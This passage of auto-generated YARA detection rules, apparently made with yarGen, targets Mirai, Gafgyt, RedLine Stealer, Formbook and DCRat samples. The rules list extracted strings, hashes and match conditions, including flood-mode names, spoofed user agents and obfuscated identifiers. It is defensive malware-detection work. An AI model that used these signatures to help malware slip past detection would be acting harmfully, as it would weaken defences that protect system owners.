      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                      ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */ /* score: '26.50'*/
      $s5 = "aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                         ' */ /* score: '24.00'*/
      $s6 = "HEXBYPASS" fullword ascii /* score: '17.50'*/
      $s7 = "UDPBYPASS" fullword ascii /* score: '17.50'*/
      $s8 = "TCPBYPASS" fullword ascii /* score: '17.50'*/
      $s9 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s11 = "__stdio_mutex_initializer.3860" fullword ascii /* score: '15.00'*/
      $s12 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s13 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s14 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)" fullword ascii /* score: '15.00'*/
      $s15 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      8 of them
}

rule Mirai_signature__22460aec {
   meta:
      description = "dropzone - file Mirai(signature)_22460aec.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "22460aec59eded810bc76f0fc6c974da617f23c5167ba1c35c26a90e2c50a96d"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                      ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */ /* score: '26.50'*/
      $s5 = "aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                         ' */ /* score: '24.00'*/
      $s6 = "HEXBYPASS" fullword ascii /* score: '17.50'*/
      $s7 = "UDPBYPASS" fullword ascii /* score: '17.50'*/
      $s8 = "TCPBYPASS" fullword ascii /* score: '17.50'*/
      $s9 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s11 = "__stdio_mutex_initializer.3812" fullword ascii /* score: '15.00'*/
      $s12 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s13 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s14 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)" fullword ascii /* score: '15.00'*/
      $s15 = "/home/firmware/build/temp-sh4/gcc-core/gcc/config/sh/lib1funcs.asm" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule Mirai_signature__555d3ba4 {
   meta:
      description = "dropzone - file Mirai(signature)_555d3ba4.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "555d3ba4af0532c369c9ef053f97f6260b143cf03502d290154f7458bdb47b14"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                      ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */ /* score: '26.50'*/
      $s5 = "aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                         ' */ /* score: '24.00'*/
      $s6 = "HEXBYPASS" fullword ascii /* score: '17.50'*/
      $s7 = "UDPBYPASS" fullword ascii /* score: '17.50'*/
      $s8 = "TCPBYPASS" fullword ascii /* score: '17.50'*/
      $s9 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mo" ascii /* score: '17.00'*/
      $s11 = "__stdio_mutex_initializer.3828" fullword ascii /* score: '15.00'*/
      $s12 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s13 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)" fullword ascii /* score: '15.00'*/
      $s14 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)" fullword ascii /* score: '15.00'*/
      $s15 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "dropzone - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "900498d3f7fb82fa595230e9aa40f2a77b94b13c1bdb7dd017fcfeb8a549e23e"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s3 = "twGS.exe" fullword wide /* score: '22.00'*/
      $s4 = "twGS.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "txtCommand" fullword wide /* score: '12.00'*/
      $s6 = "get_PlOG" fullword ascii /* score: '11.00'*/
      $s7 = "get_AssemblyDescription" fullword ascii /* score: '11.00'*/
      $s8 = "GetPlanet" fullword ascii /* score: '9.00'*/
      $s9 = "GetFleet" fullword ascii /* score: '9.00'*/
      $s10 = "tbxContent" fullword wide /* score: '9.00'*/
      $s11 = "Client Socket Program - Server Connected ..." fullword wide /* score: '9.00'*/
      $s12 = "hazemark" fullword ascii /* score: '8.00'*/
      $s13 = "get_AssemblyCompany" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ec5e665d {
   meta:
      description = "dropzone - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ec5e665d.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "ec5e665d278e31c0fd23a0aa2c3a64bbb25264b7b08377798512ba97e07fda09"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s3 = "XcRT.exe" fullword wide /* score: '22.00'*/
      $s4 = "XcRT.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "txtCommand" fullword wide /* score: '12.00'*/
      $s6 = "get_AssemblyDescription" fullword ascii /* score: '11.00'*/
      $s7 = "tu9%p:\\" fullword ascii /* score: '9.50'*/
      $s8 = "GetPlanet" fullword ascii /* score: '9.00'*/
      $s9 = "GetFleet" fullword ascii /* score: '9.00'*/
      $s10 = "tbxContent" fullword wide /* score: '9.00'*/
      $s11 = "Client Socket Program - Server Connected ..." fullword wide /* score: '9.00'*/
      $s12 = "hazemark" fullword ascii /* score: '8.00'*/
      $s13 = "get_AssemblyCompany" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Ga_gyt_signature__008a0633 {
   meta:
      description = "dropzone - file Ga-gyt(signature)_008a0633.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "008a06339d65629a6ada81d739e6f23e9197002f58c735381a00a5a10140697d"
   strings:
      $s1 = "__stdio_mutex_initializer.3833" fullword ascii /* score: '15.00'*/
      $s2 = "estridx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ga_gyt_signature__32a0e9cf {
   meta:
      description = "dropzone - file Ga-gyt(signature)_32a0e9cf.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "32a0e9cf77caa71ae112c52795b6cad3b189717e28d39c414c537e0231ff5004"
   strings:
      $s1 = "__stdio_mutex_initializer.3860" fullword ascii /* score: '15.00'*/
      $s2 = "/home/firmware/build/temp-sparc/gcc-core/gcc" fullword ascii /* score: '11.00'*/
      $s3 = "/home/firmware/build/temp-sparc/gcc-core/gcc/libgcc2.c" fullword ascii /* score: '11.00'*/
      $s4 = "/home/firmware/build/temp-sparc/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s5 = "estridx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ga_gyt_signature__50ccd1fc {
   meta:
      description = "dropzone - file Ga-gyt(signature)_50ccd1fc.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "50ccd1fcaea58a4ce16e7602e3b4b053acc09040a64a5604a41cfb3a53d8c2a4"
   strings:
      $s1 = "__stdio_mutex_initializer.4636" fullword ascii /* score: '15.00'*/
      $s2 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s3 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii /* score: '11.00'*/
      $s4 = "/home/landley/work/ab7/build/temp-armv6l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s5 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s6 = "clock_getres.c" fullword ascii /* score: '9.00'*/
      $s7 = "__GI_clock_getres" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Ga_gyt_signature__75dbd19e {
   meta:
      description = "dropzone - file Ga-gyt(signature)_75dbd19e.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "75dbd19e0a8e366a15d30708eef0c12d01aa6548721608992d6670de0cac41cb"
   strings:
      $s1 = "__stdio_mutex_initializer.3812" fullword ascii /* score: '15.00'*/
      $s2 = "/home/firmware/build/temp-sh4/gcc-core/gcc/config/sh/lib1funcs.asm" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Ga_gyt_signature__9aae4780 {
   meta:
      description = "dropzone - file Ga-gyt(signature)_9aae4780.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "9aae4780860f3e62025d06c5db6f2a4f52488cf8070b33897e6f049881929b83"
   strings:
      $s1 = "__stdio_mutex_initializer.4160" fullword ascii /* score: '15.00'*/
      $s2 = "clock_getres.c" fullword ascii /* score: '9.00'*/
      $s3 = "__GI_clock_getres" fullword ascii /* score: '9.00'*/
      $s4 = "__get_pc_thunk_bx" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Ga_gyt_signature__b88bb101 {
   meta:
      description = "dropzone - file Ga-gyt(signature)_b88bb101.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "b88bb101d8d2e3a231b9a3c9069660ec2724438ab5712e58dac4259f097df371"
   strings:
      $s1 = "__stdio_mutex_initializer.3929" fullword ascii /* score: '15.00'*/
      $s2 = "/home/firmware/build/temp-armv5l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s3 = "/home/firmware/build/temp-armv5l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s4 = "/home/firmware/build/temp-armv5l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ga_gyt_signature__e6f098d1 {
   meta:
      description = "dropzone - file Ga-gyt(signature)_e6f098d1.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "e6f098d1f18250a05e845ac6d402beb3adfc173a8124d53e8de9a2905cafce15"
   strings:
      $s1 = "__stdio_mutex_initializer.3991" fullword ascii /* score: '15.00'*/
      $s2 = "clock_getres.c" fullword ascii /* score: '9.00'*/
      $s3 = "__GI_clock_getres" fullword ascii /* score: '9.00'*/
      $s4 = "__get_pc_thunk_bx" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Ga_gyt_signature__fe370751 {
   meta:
      description = "dropzone - file Ga-gyt(signature)_fe370751.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "fe3707512efc513a0ed8a89b592b2db9343666546f1b5580f9f1c807e34c405a"
   strings:
      $s1 = "__stdio_mutex_initializer.3833" fullword ascii /* score: '15.00'*/
      $s2 = "estridx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "dropzone - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "4f332f4463ca0405da859acc77073973689eaea2ce3a3614a371af5759fb5f72"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\hiCGnILCeD\\src\\obj\\Debug\\hUFn.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADY" fullword ascii /* score: '27.00'*/
      $s4 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s5 = "hUFn.exe" fullword wide /* score: '22.00'*/
      $s6 = "sqlbaglantisi" fullword ascii /* score: '8.00'*/
      $s7 = "AowP* E" fullword ascii /* score: '8.00'*/
      $s8 = "secrter" fullword ascii /* score: '8.00'*/
      $s9 = "DEDi* X@4" fullword ascii /* score: '8.00'*/
      $s10 = "baglanti" fullword ascii /* score: '8.00'*/
      $s11 = "Select * From Tbl_Hastalar where HastaTc=@p1" fullword wide /* score: '8.00'*/
      $s12 = "Select * From Tbl_Branslar" fullword wide /* score: '8.00'*/
      $s13 = "Select * From Tbl_Doktorlar where DoktorTC=@p1" fullword wide /* score: '8.00'*/
      $s14 = "Select * From Tbl_Randevular where RandevuDoktor = '" fullword wide /* score: '8.00'*/
      $s15 = "Select * From Tbl_Doktorlar where DoktorTC=@p1 and DoktorSifre=@p2" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__0efeb063 {
   meta:
      description = "dropzone - file Mirai(signature)_0efeb063.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "0efeb0637ffc726dd01140d585c016c30586cfb11b47fe85926dfcdc272a0fb2"
   strings:
      $s1 = "/234678;<" fullword wide /* score: '9.00'*/ /* hex encoded string '#Fx' */
      $s2 = "knopqrs" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 80KB and
      all of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "dropzone - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "2f242c4e07bc505fa09f38cf7821d9c09ad053325e732e742941135ab92f9f9b"
   strings:
      $s1 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s2 = "wvvMsXcrVnkCmw2g8Ig.r4LmYHckinL2Qr5RPiE+At4Ebjcvowx82ToVaid+saSq3dcQr4o8D4jqDX9`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s3 = "wvvMsXcrVnkCmw2g8Ig.r4LmYHckinL2Qr5RPiE+At4Ebjcvowx82ToVaid+saSq3dcQr4o8D4jqDX9`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s4 = "P0Qhfkcodt" fullword ascii /* base64 encoded string '?D!~G(v' */ /* score: '14.00'*/
      $s5 = "RF9cfjA0Th" fullword ascii /* base64 encoded string 'D_\~04N' */ /* score: '14.00'*/
      $s6 = "O1pUJTA7Q" fullword ascii /* base64 encoded string ';ZT%0;' */ /* score: '14.00'*/
      $s7 = "ture=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s8 = "qDPUSKNJHG9LeXEClxI" fullword ascii /* score: '12.00'*/
      $s9 = "fIJpExeCmEF1Gq0PeRj" fullword ascii /* score: '12.00'*/
      $s10 = "bnZ1cG5tAE" fullword ascii /* base64 encoded string 'nvupnm ' */ /* score: '11.00'*/
      $s11 = "RiY5eDt5Ui" fullword ascii /* base64 encoded string 'F&9x;yR' */ /* score: '11.00'*/
      $s12 = "D2kwDsPyuBsVtjWSerq" fullword ascii /* score: '9.00'*/
      $s13 = "KrVuP2jspys3Ji4jvcs" fullword ascii /* score: '9.00'*/
      $s14 = "bK6CURGEMQPVGETLrVq" fullword ascii /* score: '9.00'*/
      $s15 = "BNeYEMK13TTLvGdTGjc" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__53f1b22b {
   meta:
      description = "dropzone - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_53f1b22b.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "53f1b22b7222e54552757808dd631a43c1358a87534af1ca6225bf845a4d66a3"
   strings:
      $s1 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s2 = "8STLz8CfvLkvMlpcD7M3UAFtPfOQm.exe" fullword wide /* score: '27.00'*/
      $s3 = "CKCnJvhT3SGAM9PceeN.h9qJhwhRvfny1vkXwd9+oXxrRahU6Zqsp69uEIc+lhYtB9h22Dy81XNhTNe`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s4 = "wprIm.exe" fullword wide /* score: '22.00'*/
      $s5 = "CKCnJvhT3SGAM9PceeN.h9qJhwhRvfny1vkXwd9+oXxrRahU6Zqsp69uEIc+lhYtB9h22Dy81XNhTNe`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s6 = "p0CmcG3iLLOGpCUQXaj" fullword ascii /* score: '14.00'*/
      $s7 = "elRfQ14hA" fullword ascii /* base64 encoded string 'zT_C^!' */ /* score: '14.00'*/
      $s8 = "QExhISUyD" fullword ascii /* base64 encoded string '@La!%2' */ /* score: '14.00'*/
      $s9 = "ture=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s10 = "vQDlL1ZLqZjZSm9oCfC" fullword ascii /* score: '9.00'*/
      $s11 = "LalLOgS2Xw" fullword ascii /* score: '9.00'*/
      $s12 = "kKZm1OsqiyGH7VcP0cy" fullword ascii /* score: '9.00'*/
      $s13 = "VIFtpsNaOS9dFK2PoYJ" fullword ascii /* score: '9.00'*/
      $s14 = "KjoBZvGpspYh8KBXe9F" fullword ascii /* score: '9.00'*/
      $s15 = "gCKIdLlyUQj0OrL2aTT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e558f593 {
   meta:
      description = "dropzone - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e558f593.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "e558f5933da137aada6e4743c99da665e9bd70e93e87b0dc6de33f2a31eb7b56"
   strings:
      $s1 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii /* score: '27.00'*/
      $s2 = "CKCnJvhT3SGAM9PceeN.h9qJhwhRvfny1vkXwd9+oXxrRahU6Zqsp69uEIc+lhYtB9h22Dy81XNhTNe`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s3 = "UrsscmUzRkGvh7.exe" fullword wide /* score: '22.00'*/
      $s4 = "TaizGsgPkhAxlUzzbOkyFlaUl.exe" fullword wide /* score: '22.00'*/
      $s5 = "CKCnJvhT3SGAM9PceeN.h9qJhwhRvfny1vkXwd9+oXxrRahU6Zqsp69uEIc+lhYtB9h22Dy81XNhTNe`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s6 = "p0CmcG3iLLOGpCUQXaj" fullword ascii /* score: '14.00'*/
      $s7 = "elRfQ14hA" fullword ascii /* base64 encoded string 'zT_C^!' */ /* score: '14.00'*/
      $s8 = "QExhISUyD" fullword ascii /* base64 encoded string '@La!%2' */ /* score: '14.00'*/
      $s9 = "ture=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s10 = "vQDlL1ZLqZjZSm9oCfC" fullword ascii /* score: '9.00'*/
      $s11 = "LalLOgS2Xw" fullword ascii /* score: '9.00'*/
      $s12 = "kKZm1OsqiyGH7VcP0cy" fullword ascii /* score: '9.00'*/
      $s13 = "VIFtpsNaOS9dFK2PoYJ" fullword ascii /* score: '9.00'*/
      $s14 = "KjoBZvGpspYh8KBXe9F" fullword ascii /* score: '9.00'*/
      $s15 = "gCKIdLlyUQj0OrL2aTT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f70494d0 {
   meta:
      description = "dropzone - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f70494d0.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "f70494d01a5def6620e1e6dd3aed28f5c852989f58039970aa6831ff5075fd64"
   strings:
      $s1 = "H4sIAAAAAAAEAAXB0QqDIBQA0G/Ke+u2x7FEyAqctZnv1YYQt2ws/PrOwVKm582m36ZmYbPFvfrAstrlxxdvrh1oHVXhz/aLSGsYqTFTh0zjlMER/qRAq0pzbuCB5Ido" wide /* score: '11.00'*/
      $s2 = "H4sIAAAAAAAEAAXBSwqAIBAA0DMJYm1blAtJrIkaWoalJBF9xsrT917Oo/BUplfUjKVcSYTu2obs6/VuCpPQHnIE9JzhZLV1rim0PFW7uDNeJhhYncX7IXiFj2MFdaup" wide /* score: '11.00'*/
      $s3 = "H4sIAAAAAAAEAEssr/Bxzcj2cncOTXZ08koMSbcwck7PD/MwcHPxdXTzCSx3C3INjwoIcgr1DAw10Y/IiHIJzzZJ8zKwcHd2Cgx1d3YLCHIsDwsMM8wOdPQMA8oVAgCU" wide /* score: '11.00'*/
      $s4 = "Confuser.Core 1.6.0+447341964f" fullword ascii /* score: '10.00'*/
      $s5 = "H4sIAAAAAAAEAHP0cfcHACMRNyIEAAAA" fullword wide /* score: '9.00'*/
      $s6 = "H4sIAAAAAAAEACspywUAC9rf5gMAAAA=" fullword wide /* score: '9.00'*/
      $s7 = "H4sIAAAAAAAEAMvKT03Kr0jOzyspys/RS61IBQBs4Ht3EQAAAA==" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Mirai_signature__a155fa86 {
   meta:
      description = "dropzone - file Mirai(signature)_a155fa86.elf"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "a155fa86c4f96777815a3d6a389d98048a4f953cec629601b21201859d0757a6"
   strings:
